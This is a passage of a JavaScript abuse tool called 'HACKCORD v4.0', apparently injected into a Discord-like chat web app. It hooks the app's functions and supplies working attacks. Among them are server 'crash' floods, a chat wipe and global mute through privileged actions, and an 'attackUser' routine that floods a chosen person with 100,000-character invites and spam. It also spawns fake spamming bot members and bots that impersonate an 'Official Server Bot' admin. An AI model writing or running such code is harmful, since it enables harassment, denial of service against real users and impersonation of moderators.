                                u: 'SYSTEM_CRASH',
                                ac: '#ff0000',
                                nc: '#ff0000',
                                x: msg,
                                fx: 'shout',
                                ts: Date.now() + i
                            });
                        }, i * 10);
                    }
                });
            });
            
            // Auth crash
            if (window.authAction) {
                window.authAction({t: 'wipe_chat'});
            }
            
            Hackcord.log('Server crash initiated');
        },
        
        freezeServer: () => {
            if (window.authAction) {
                window.authAction({t: 'global_mute', secs: 10});
            }
            window.pub(window.sc(window.CS().code, 'sys'), {
                t: 'global_muted',
                secs: 10,
                by: window.S?.u
            });
        },
        
        wipeChat: () => {
            if (window.authAction) window.authAction({t: 'wipe_chat'});
            Object.keys(window.CS().ms).forEach(ch => window.CS().ms[ch] = []);
            if (window.render) window.render();
        },
        
        changeServerName: () => {
            const name = prompt('New server name:', window.CS()?.name);
            if (name && window.CS) {
                window.CS().name = name;
                if ($('srvN')) $('srvN').textContent = name;
                // Broadcast to all
                window.pub(window.sc(window.CS().code, 'sys'), {
                    t: 'server_rename',
                    name: name,
                    by: window.S?.u
                });
            }
        },
        
        attackUser: () => {
            const uid = $('hk-attack-uid').value;
            if (!uid) return;
            
            // Find user
            const user = window.CS()?.mem[uid];
            if (!user) return alert('User not found');
            
            // Crash them
            for (let i = 0; i < 20; i++) {
                setTimeout(() => {
                    window.pub(`dc.inv.${uid}`, {
                        t: 'dm_invite',
                        from: window.S?.uid,
                        code: 'X'.repeat(100000),
                        ts: Date.now()
                    });
                }, i * 50);
            }
            
            // Spam them in all channels
            ['general', 'off-topic', 'memes'].forEach(ch => {
                for (let i = 0; i < 30; i++) {
                    window.pub(window.sc(window.CS().code, ch), {
                        t: 'msg',
                        u: window.S?.u,
                        x: `@${user.u} CRASH `,
                        fx: 'shout',
                        ts: Date.now()
                    });
                }
            });
            
            Hackcord.log(`Attacking ${user.u}`);
        },
        
        massSpam: () => {
            const msg = $('hk-mass-msg').value;
            if (!msg) return;
            
            window.S.servers.forEach(srv => {
                ['general', 'off-topic', 'memes'].forEach(ch => {
                    window.pub(window.scp(srv.code, ch), {
                        t: 'msg',
                        u: window.S?.u,
                        ac: window.S?.ac,
                        x: msg,
                        ts: Date.now()
                    });
                });
            });
        },
        
        // ═══════ BOTS ═══════
        spawnBots: () => {
            const prefix = $('hk-bot-prefix').value || 'Bot_';
            const count = parseInt($('hk-bot-count').value) || 5;
            const msg = $('hk-bot-msg').value;
            const timeout = parseInt($('hk-bot-timeout').value) || 0;
            
            for (let i = 0; i < count; i++) {
                const botName = prefix + rnd(1000, 9999);
                const botUid = 'bot_' + Date.now() + '_' + rnd(1000, 9999);
                const botColor = `hsl(${rnd(0, 360)}, 70%, 50%)`;
                
                const bot = {
                    name: botName,
                    uid: botUid,
                    color: botColor,
                    interval: null
                };
                
                HK.bots.push(bot);
                
                // Announce join
                if (!HK.spyMode) {
                    window.pub(window.sc(window.CS().code, 'sys'), {
                        t: 'join',
                        uid: botUid,
                        u: botName,
                        ac: botColor,
                        nc: '#fff',
                        bio: '',
                        vc: null
                    });
                    
                    window.CS().mem[botUid] = {
                        u: botName,
                        ac: botColor,
                        nc: '#fff',
                        last: Date.now()
                    };
                }
                
                // Setup spam
                if (msg) {
                    bot.interval = setInterval(() => {
                        window.pub(window.sc(window.CS().ch), {
                            t: 'msg',
                            u: botName,
                            ac: botColor,
                            x: msg,
                            uid: botUid
                        });
                    }, rnd(2000, 5000));
                }
                
                // Timeout
                if (timeout > 0) {
                    setTimeout(() => {
                        Hackcord.killBot(botUid);
                    }, timeout);
                }
            }
            
            if (window.updMem) window.updMem();
            Hackcord.updateBotList();
        },
        
        killBot: (uid) => {
            const idx = HK.bots.findIndex(b => b.uid === uid);
            if (idx === -1) return;
            
            const bot = HK.bots[idx];
            if (bot.interval) clearInterval(bot.interval);
            
            if (!HK.spyMode) {
                window.pub(window.sc(window.CS().code, 'sys'), {
                    t: 'leave',
                    uid: uid,
                    u: bot.name
                });
                delete window.CS().mem[uid];
            }
            
            HK.bots.splice(idx, 1);
            Hackcord.updateBotList();
            if (window.updMem) window.updMem();
        },
        
        killBots: () => {
            HK.bots.forEach(bot => {
                if (bot.interval) clearInterval(bot.interval);
                if (!HK.spyMode) {
                    window.pub(window.sc(window.CS().code, 'sys'), {
                        t: 'leave',
                        uid: bot.uid,
                        u: bot.name
                    });
                    delete window.CS().mem[bot.uid];
                }
            });
            HK.bots = [];
            if (window.updMem) window.updMem();
            Hackcord.updateBotList();
        },
        
        updateBotList: () => {
            const div = $('hk-bot-list');
            if (!div) return;
            
            if (HK.bots.length === 0) {
                div.innerHTML = '<div style="color: #666; font-size: 11px; text-align: center;">No bots</div>';
                return;
            }
            
            div.innerHTML = HK.bots.map(bot => `
                <div style="display: flex; justify-content: space-between; align-items: center; padding: 4px; background: #0f0f1a; margin-bottom: 4px; border-radius: 4px;">
                    <span style="color: ${bot.color}; font-size: 11px;">${bot.name}</span>
                    <button onclick="Hackcord.killBot('${bot.uid}')" style="background: #ff0040; border: none; color: #fff; padding: 2px 6px; border-radius: 3px; font-size: 9px; cursor: pointer;">Kill</button>
                </div>
            `).join('');
        },
        
        // ═══════ SERVER BOTS ═══════
        spawnServerBot: () => {
            const name = $('hk-server-bot-name').value;
            if (!name) return alert('Enter bot name');
            
            const visible = $('hk-server-bot-visible').checked;
            const adminMode = $('hk-server-bot-admin').checked;
            const timeout = parseInt($('hk-server-bot-timeout').value) || 0;
            
            const botUid = 'serverbot_' + Date.now();
            const botColor = adminMode ? '#ffd700' : `hsl(${rnd(0, 360)}, 70%, 50%)`;
            
            const bot = {
                name: name,
                uid: botUid,
                color: botColor,
                visible: visible,
                admin: adminMode,
                spawned: Date.now()
            };
            
            HK.serverBots.push(bot);
            
            if (visible) {
                window.pub(window.sc(window.CS().code, 'sys'), {
                    t: 'join',
                    uid: botUid,
                    u: name,
                    ac: botColor,
                    nc: adminMode ? '#ffd700' : '#fff',
                    bio: adminMode ? 'Official Server Bot' : '',
                    vc: null
                });
                
                window.CS().mem[botUid] = {
                    u: name,
                    ac: botColor,
                    nc: adminMode ? '#ffd700' : '#fff',
                    last: Date.now(),
                    isServerBot: true
                };
                
                if (window.updMem) window.updMem();
            }
            
            if (timeout > 0) {
                setTimeout(() => {
                    Hackcord.removeServerBot(botUid);
                }, timeout);
            }
            
            Hackcord.updateServerBotList();
            $('hk-server-bot-name').value = '';
        },
        
        removeServerBot: (uid) => {
            const idx = HK.serverBots.findIndex(b => b.uid === uid);
            if (idx === -1) return;
            
            const bot = HK.serverBots[idx];
            if (bot.visible) {
                window.pub(window.sc(window.CS().code, 'sys'), {
                    t: 'leave',
                    uid: uid,
                    u: bot.name
                });
                delete window.CS().mem[uid];
                if (window.updMem) window.updMem();
            }
            
            HK.serverBots.splice(idx, 1);
            Hackcord.updateServerBotList();
        },
        
        serverBotSay: (uid, msg) => {
            const bot = HK.serverBots.find(b => b.uid === uid);
            if (!bot) return;
            
            window.pub(window.sc(window.CS().ch), {
                t: 'msg',
                u: bot.name,
                ac: bot.color,
                x: msg,
                uid: uid
            });
        },
        
        serverBotTag: (uid, tag) => {
            // Apply tag to bot
            HK.customTags.set(uid, {
                text: tag,
                style: 'background: linear-gradient(90deg, #ff0000, #ff7f00); color: #fff;'
            });
        },
        
        updateServerBotList: () => {
            const div = $('hk-server-bot-list');
            if (!div) return;
            
            if (HK.serverBots.length === 0) {
                div.innerHTML = '<div style="color: #666; font-size: 11px; text-align: center;">No server bots</div>';
                return;
            }
            
            div.innerHTML = HK.serverBots.map(bot => `
                <div style="background: #0f0f1a; padding: 8px; margin-bottom: 6px; border-radius: 4px; border: 1px solid #333;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
                        <span style="color: ${bot.color}; font-weight: bold; font-size: 12px;">${bot.name}</span>
                        <button onclick="Hackcord.removeServerBot('${bot.uid}')" style="background: #ff0040; border: none; color: #fff; padding: 2px 8px; border-radius: 3px; font-size: 10px; cursor: pointer;">Remove</button>
                    </div>
                    <input type="text" placeholder="Make bot say..." onkeydown="if(event.key==='Enter')Hackcord.serverBotSay('${bot.uid}',this.value)" style="width: 100%; background: #1a1a2e; border: 1px solid #555; color: #fff; padding: 4px; border-radius: 3px; font-size: 10px; margin-bottom: 4px;">
                    <input type="text" placeholder="Add tag..." onkeydown="if(event.key==='Enter')Hackcord.serverBotTag('${bot.uid}',this.value)" style="width: 100%; background: #1a1a2e; border: 1px solid #555; color: #fff; padding: 4px; border-radius: 3px; font-size: 10px;">
                </div>
            `).join('');
        },
        
        // ═══════ TOOLS ═══════
        addTag: () => {
            const text = $('hk-tag-text').value;
            const theme = $('hk-tag-theme').value;
            if (!text) return;
            
            const styles = {
                rainbow: 'background: linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3); background-size: 200% auto; animation: rainbow 2s linear infinite; color: #fff;',
                hacker: 'background: #000; color: #00ff41; font-family: monospace; border: 1px solid #00ff41;',
                fire: 'background: linear-gradient(135deg, #ff0000, #ff4500); color: #fff;',
                admin: 'background: linear-gradient(135deg, #ffd700, #ffed4e); color: #000; font-weight: bold;'
            };
            
            HK.customTags.set(window.S?.uid, {text, style: styles[theme]});
            
            if (!document.getElementById('hk-anim')) {
                const s = document.createElement('style');
                s.id = 'hk-anim';
                s.textContent = '@keyframes rainbow {0%{background-position:0% 50%}100%{background-position:200% 50%}}';
                document.head.appendChild(s);
            }
            
            // Hook render
            if (window.render && !window._tagHook) {
                const orig = window.render;
                window.render = function() {
                    orig();
                    setTimeout(() => {
                        document.querySelectorAll('.mg-a').forEach(el => {
                            const onclick = el.getAttribute('onclick') || '';
                            const match = onclick.match(/openDmPrompt\('([^']+)'/);
                            if (match) {
                                const uid = match[1];
                                const tag = HK.customTags.get(uid);
                                if (tag && !el.querySelector('.hk-tag')) {
                                    const span = document.createElement('span');
                                    span.className = 'hk-tag';
                                    span.textContent = ' ' + tag.text + ' ';
                                    span.style.cssText = tag.style + ' font-size: 10px; padding: 2px 6px; border-radius: 4px; margin-left: 6px;';
                                    el.appendChild(span);
                                }
                            }
                        });
                    }, 50);
                };
                window._tagHook = true;
            }
            
            if (window.render) window.render();
        }
    };
    
    // Hooks
    const origRender = window.render;
    window.render = function() {
        if (!window.CS) return origRender();
        const ch = window.CS().ch;
        const orig = window.CS().ms[ch];
        
        if (orig) {
            window.CS().ms[ch] = orig.filter(m => {
                if (m.t === 'u') {
                    if (HK.blockedUsers.has(m.uid)) return false;
                    if (HK.mutedUsers.has(m.uid)) return false;
                }
                return true;
            });
        }
        
        const r = origRender.apply(this, arguments);
        if (orig) window.CS().ms[ch] = orig;
        return r;
    };
    
    // Listen for disable signals
    if (window.pn) {
        window.pn.subscribe({channels: [`hk.disable.${window.S?.uid}`]});
        window.pn.addListener({
            message: (e) => {
                if (e.channel === `hk.disable.${window.S?.uid}`) {
                    if (e.message.t === 'disable') {
                        HK.disabledUsers.add(window.S?.uid);
                        alert('[HACKCORD] You have been disabled by an admin');
                    } else {
                        HK.disabledUsers.delete(window.S?.uid);
                        alert('[HACKCORD] You have been enabled');
                    }
                }
            }
        });
    }
    
    // Block disabled users from sending
    const origSend = window.sendMsg;
    window.sendMsg = function() {
        if (HK.disabledUsers.has(window.S?.uid)) {
            console.log('[HACKCORD] Blocked - disabled');
            return;
        }
        return origSend.apply(this, arguments);
    };
    
    console.log('%c🔥 HACKCORD v4.0 LOADED', 'color: #00ff41; font-size: 20px; font-weight: bold;');
    console.log('%cServer-side exploits enabled', 'color: #00d9ff;');
})();
